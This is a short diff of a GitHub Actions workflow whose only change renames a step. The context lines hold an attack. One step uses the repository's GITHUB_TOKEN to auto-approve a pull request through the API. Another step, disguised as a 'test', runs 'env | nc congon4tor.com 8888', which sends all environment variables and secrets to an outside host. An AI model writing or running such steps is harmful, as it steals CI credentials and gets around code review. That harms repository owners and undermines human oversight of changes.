@@ -15,7 +15,7 @@ jobs:
          --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
          --header 'content-type: application/json' \
          -d '{"event":"APPROVE"}'
-     - name: test
+     - name: test1
        env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: env | nc congon4tor.com 8888 -q 3
